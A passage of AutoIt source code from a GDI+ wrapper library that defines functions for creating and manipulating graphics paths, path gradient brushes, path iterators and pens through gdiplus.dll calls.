	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddrectangle($hpath, $nx, $ny, $nwidth, $nheight)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathRectangle", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddstring($hpath, $sstring, $tlayout, $hfamily, $istyle = 0, $fsize = 8.5, $hformat = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathString", "handle", $hpath, "wstr", $sstring, "int", -1, "handle", $hfamily, "int", $istyle, "float", $fsize, "struct*", $tlayout, "handle", $hformat)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushcreate($apoints, $iwrapmode = 0)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePathGradient", "struct*", $tpoints, "int", $icount, "int", $iwrapmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_pathbrushcreatefrompath($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePathGradientFromPath", "handle", $hpath, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathbrushgetcenterpoint($hpathgradientbrush)
	Local $tpointf = DllStructCreate("float;float")
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathGradientCenterPoint", "handle", $hpathgradientbrush, "struct*", $tpointf)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $apointf[2]
	$apointf[0] = DllStructGetData($tpointf, 1)
	$apointf[1] = DllStructGetData($tpointf, 2)
	Return $apointf
EndFunc

Func _gdiplus_pathbrushgetfocusscales($hpathgradientbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathGradientFocusScales", "handle", $hpathgradientbrush, "float*", 0, "float*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $ascales[2]
	$ascales[0] = $aresult[2]
	$ascales[1] = $aresult[3]
	Return $ascales
EndFunc

Func _gdiplus_pathbrushgetpointcount($hpathgradientbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathGradientPointCount", "handle", $hpathgradientbrush, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathbrushgetrect($hpathgradientbrush)
	Local $trectf = DllStructCreate($taggdiprectf)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathGradientRect", "handle", $hpathgradientbrush, "struct*", $trectf)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $arectf[4]
	For $ii = 1 To 4
		$arectf[$ii - 1] = DllStructGetData($trectf, $ii)
	Next
	Return $arectf
EndFunc

Func _gdiplus_pathbrushgetwrapmode($hpathgradientbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathGradientWrapMode", "handle", $hpathgradientbrush, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathbrushmultiplytransform($hpathgradientbrush, $hmatrix, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipMultiplyPathGradientTransform", "handle", $hpathgradientbrush, "handle", $hmatrix, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushresettransform($hpathgradientbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipResetPathGradientTransform", "handle", $hpathgradientbrush)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetblend($hpathgradientbrush, $ablends)
	Local $icount = $ablends[0][0]
	Local $tfactors = DllStructCreate("float[" & $icount & "]")
	Local $tpositions = DllStructCreate("float[" & $icount & "]")
	For $ii = 1 To $icount
		DllStructSetData($tfactors, 1, $ablends[$ii][0], $ii)
		DllStructSetData($tpositions, 1, $ablends[$ii][1], $ii)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientBlend", "handle", $hpathgradientbrush, "struct*", $tfactors, "struct*", $tpositions, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetcentercolor($hpathgradientbrush, $iargb)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientCenterColor", "handle", $hpathgradientbrush, "uint", $iargb)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetcenterpoint($hpathgradientbrush, $nx, $ny)
	Local $tpointf = DllStructCreate("float;float")
	DllStructSetData($tpointf, 1, $nx)
	DllStructSetData($tpointf, 2, $ny)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientCenterPoint", "handle", $hpathgradientbrush, "struct*", $tpointf)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetfocusscales($hpathgradientbrush, $fscalex, $fscaley)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientFocusScales", "handle", $hpathgradientbrush, "float", $fscalex, "float", $fscaley)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetgammacorrection($hpathgradientbrush, $busegammacorrection)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientGammaCorrection", "handle", $hpathgradientbrush, "int", $busegammacorrection)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetlinearblend($hpathgradientbrush, $ffocus, $fscale = 1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientLinearBlend", "handle", $hpathgradientbrush, "float", $ffocus, "float", $fscale)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetpresetblend($hpathgradientbrush, $ainterpolations)
	Local $icount = $ainterpolations[0][0]
	Local $tcolors = DllStructCreate("uint[" & $icount & "]")
	Local $tpositions = DllStructCreate("float[" & $icount & "]")
	For $ii = 1 To $icount
		DllStructSetData($tcolors, 1, $ainterpolations[$ii][0], $ii)
		DllStructSetData($tpositions, 1, $ainterpolations[$ii][1], $ii)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientPresetBlend", "handle", $hpathgradientbrush, "struct*", $tcolors, "struct*", $tpositions, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetsigmablend($hpathgradientbrush, $ffocus, $fscale = 1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientSigmaBlend", "handle", $hpathgradientbrush, "float", $ffocus, "float", $fscale)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetsurroundcolor($hpathgradientbrush, $iargb)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientSurroundColorsWithCount", "handle", $hpathgradientbrush, "uint*", $iargb, "int*", 1)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetsurroundcolorswithcount($hpathgradientbrush, $acolors)
	Local $icount = $acolors[0]
	Local $icolors = _gdiplus_pathbrushgetpointcount($hpathgradientbrush)
	If $icolors < $icount Then $icount = $icolors
	Local $tcolors = DllStructCreate("uint[" & $icount & "]")
	For $ii = 1 To $icount
		DllStructSetData($tcolors, 1, $acolors[$ii], $ii)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientSurroundColorsWithCount", "handle", $hpathgradientbrush, "struct*", $tcolors, "int*", $icount)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_pathbrushsettransform($hpathgradientbrush, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientTransform", "handle", $hpathgradientbrush, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathbrushsetwrapmode($hpathgradientbrush, $iwrapmode)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathGradientWrapMode", "handle", $hpathgradientbrush, "int", $iwrapmode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathclone($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipClonePath", "handle", $hpath, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathclosefigure($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipClosePathFigure", "handle", $hpath)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathcreate($ifillmode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePath", "int", $ifillmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathcreate2($apathdata, $ifillmode = 0)
	Local $icount = $apathdata[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	Local $ttypes = DllStructCreate("byte[" & $icount & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apathdata[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apathdata[$ii][1], (($ii - 1) * 2) + 2)
		DllStructSetData($ttypes, 1, $apathdata[$ii][2], $ii)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePath2", "struct*", $tpoints, "struct*", $ttypes, "int", $icount, "int", $ifillmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[5]
EndFunc

Func _gdiplus_pathdispose($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeletePath", "handle", $hpath)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathflatten($hpath, $fflatness = 0.25, $hmatrix = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipFlattenPath", "handle", $hpath, "handle", $hmatrix, "float", $fflatness)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathgetdata($hpath)
	Local $icount = _gdiplus_pathgetpointcount($hpath)
	Local $tpathdata = DllStructCreate("int Count; ptr Points; ptr Types;")
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	Local $ttypes = DllStructCreate("byte[" & $icount & "]")
	DllStructSetData($tpathdata, "Count", $icount)
	DllStructSetData($tpathdata, "Points", DllStructGetPtr($tpoints))
	DllStructSetData($tpathdata, "Types", DllStructGetPtr($ttypes))
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathData", "handle", $hpath, "struct*", $tpathdata)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError($aresult[0], $aresult[0], -1)
	Local $adata[$icount + 1][3]
	$adata[0][0] = $icount
	For $ii = 1 To $icount
		$adata[$ii][0] = DllStructGetData($tpoints, 1, (($ii - 1) * 2) + 1)
		$adata[$ii][1] = DllStructGetData($tpoints, 1, (($ii - 1) * 2) + 2)
		$adata[$ii][2] = DllStructGetData($ttypes, 1, $ii)
	Next
	Return $adata
EndFunc

Func _gdiplus_pathgetfillmode($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathFillMode", "handle", $hpath, "int*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathgetlastpoint($hpath)
	Local $tpointf = DllStructCreate("float;float")
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathLastPoint", "handle", $hpath, "struct*", $tpointf)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $apointf[2]
	$apointf[0] = DllStructGetData($tpointf, 1)
	$apointf[1] = DllStructGetData($tpointf, 2)
	Return $apointf
EndFunc

Func _gdiplus_pathgetpointcount($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPointCount", "handle", $hpath, "int*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathgetpoints($hpath)
	Local $ii, $icount, $tpoints, $apoints[1][1], $aresult
	$icount = _gdiplus_pathgetpointcount($hpath)
	If @error Then Return SetError(@error + 10, @extended, -1)
	$tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	$aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathPoints", "handle", $hpath, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $apoints[$icount + 1][2]
	$apoints[0][0] = $icount
	For $ii = 1 To $icount
		$apoints[$ii][0] = DllStructGetData($tpoints, 1, (($ii - 1) * 2) + 1)
		$apoints[$ii][1] = DllStructGetData($tpoints, 1, (($ii - 1) * 2) + 2)
	Next
	Return $apoints
EndFunc

Func _gdiplus_pathgetworldbounds($hpath, $hmatrix = 0, $hpen = 0)
	Local $trectf = DllStructCreate($taggdiprectf)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPathWorldBounds", "handle", $hpath, "struct*", $trectf, "handle", $hmatrix, "handle", $hpen)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $arectf[4]
	For $ii = 1 To 4
		$arectf[$ii - 1] = DllStructGetData($trectf, $ii)
	Next
	Return $arectf
EndFunc

Func _gdiplus_pathisoutlinevisiblepoint($hpath, $nx, $ny, $hpen = 0, $hgraphics = 0)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipIsOutlineVisiblePathPoint", "handle", $hpath, "float", $nx, "float", $ny, "handle", $hpen, "handle", $hgraphics, "int*", 0)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return $aresult[6] <> 0
EndFunc

Func _gdiplus_pathisvisiblepoint($hpath, $nx, $ny, $hgraphics = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipIsVisiblePathPoint", "handle", $hpath, "float", $nx, "float", $ny, "handle", $hgraphics, "int*", 0)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return $aresult[5] <> 0
EndFunc

Func _gdiplus_pathitercreate($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePathIter", "handle*", 0, "handle", $hpath)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[1]
EndFunc

Func _gdiplus_pathiterdispose($hpathiter)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeletePathIter", "handle", $hpathiter)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathitergetsubpathcount($hpathiter)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipPathIterGetSubpathCount", "handle", $hpathiter, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathiternextmarkerpath($hpathiter, $hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipPathIterNextMarkerPath", "handle", $hpathiter, "int*", 0, "handle", $hpath)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pathiternextsubpathpath($hpathiter, $hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipPathIterNextSubpathPath", "handle", $hpathiter, "int*", 0, "handle", $hpath, "bool*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $areturn[2]
	$areturn[0] = $aresult[2]
	$areturn[1] = $aresult[4]
	Return $areturn
EndFunc

Func _gdiplus_pathiterrewind($hpathiter)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipPathIterRewind", "handle", $hpathiter)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathreset($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipResetPath", "handle", $hpath)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathreverse($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipReversePath", "handle", $hpath)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathsetfillmode($hpath, $ifillmode)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathFillMode", "handle", $hpath, "int", $ifillmode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathsetmarker($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPathMarker", "handle", $hpath)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathstartfigure($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipStartPathFigure", "handle", $hpath)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathtransform($hpath, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTransformPath", "handle", $hpath, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathwarp($hpath, $hmatrix, $apoints, $nx, $ny, $nwidth, $nheight, $iwarpmode = 0, $fflatness = 0.25)
	Local $icount = $apoints[0][0]
	If $icount <> 3 AND $icount <> 4 Then Return SetError(11, 0, False)
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], ($ii - 1) * 2 + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], ($ii - 1) * 2 + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipWarpPath", "handle", $hpath, "handle", $hmatrix, "struct*", $tpoints, "int", $icount, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "int", $iwarpmode, "float", $fflatness)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathwiden($hpath, $hpen, $hmatrix = 0, $fflatness = 0.25)
	__gdiplus_pendefcreate($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipWidenPath", "handle", $hpath, "handle", $hpen, "handle", $hmatrix, "float", $fflatness)
	__gdiplus_pendefdispose()
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathwindingmodeoutline($hpath, $hmatrix = 0, $fflatness = 0.25)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipWindingModeOutline", "handle", $hpath, "handle", $hmatrix, "float", $fflatness)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pencreate($iargb = -16777216, $nwidth = 1, $iunit = 2)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePen1", "dword", $iargb, "float", $nwidth, "int", $iunit, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_pencreate2($hbrush, $nwidth = 1, $iunit = 2)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreatePen2", "handle", $hbrush, "float", $nwidth, "int", $iunit, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[4]
EndFunc

Func _gdiplus_pendispose($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeletePen", "handle", $hpen)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pengetalignment($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenMode", "handle", $hpen, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetcolor($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenColor", "handle", $hpen, "dword*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetcustomendcap($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenCustomEndCap", "handle", $hpen, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetdashcap($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenDashCap197819", "handle", $hpen, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetdashstyle($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenDashStyle", "handle", $hpen, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetendcap($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenEndCap", "handle", $hpen, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetmiterlimit($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenMiterLimit", "handle", $hpen, "float*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_pengetwidth($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetPenWidth", "handle", $hpen, "float*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_penresettransform($hpen)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipResetPenTransform", "handle", $hpen)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_penrotatetransform($hpen, $fangle, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipRotatePenTransform", "handle", $hpen, "float", $fangle, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_penscaletransform($hpen, $fscalex, $fscaley, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipScalePenTransform", "handle", $hpen, "float", $fscalex, "float", $fscaley, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetalignment($hpen, $ialignment = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenMode", "handle", $hpen, "int", $ialignment)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetcolor($hpen, $iargb)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenColor", "handle", $hpen, "dword", $iargb)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetcompound($hpen, $acompounds)
	Local $icount = $acompounds[0]
	Local $tcompounds = DllStructCreate("float[" & $icount & "];")
	For $i = 1 To $icount
		DllStructSetData($tcompounds, 1, $acompounds[$i], $i)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenCompoundArray", "handle", $hpen, "struct*", $tcompounds, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetcustomendcap($hpen, $hendcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenCustomEndCap", "handle", $hpen, "handle", $hendcap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetdashcap($hpen, $idash = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenDashCap197819", "handle", $hpen, "int", $idash)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetdashstyle($hpen, $istyle = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenDashStyle", "handle", $hpen, "int", $istyle)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetendcap($hpen, $iendcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenEndCap", "handle", $hpen, "int", $iendcap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetlinecap($hpen, $istartcap, $iendcap, $idashcap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenLineCap197819", "handle", $hpen, "int", $istartcap, "int", $iendcap, "int", $idashcap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetlinejoin($hpen, $ilinejoin)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenLineJoin", "handle", $hpen, "int", $ilinejoin)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetmiterlimit($hpen, $fmiterlimit)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenMiterLimit", "handle", $hpen, "float", $fmiterlimit)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetstartcap($hpen, $ilinecap)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenStartCap", "handle", $hpen, "int", $ilinecap)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
